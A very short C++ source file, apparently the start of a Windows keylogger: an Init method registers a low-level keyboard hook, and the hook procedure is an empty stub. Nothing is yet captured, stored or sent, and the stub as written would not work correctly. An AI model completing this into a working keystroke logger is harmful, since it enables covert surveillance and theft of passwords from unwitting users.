#include "Keylogger.h"

LRESULT Keylogger::HookProc(int code, WPARAM wParam, LPARAM lParam) {

}

int Keylogger::Init() {
    SetWindowsHookExA(WH_KEYBOARD_LL, Keylogger::HookProc, NULL, 0);
    return 0;
}
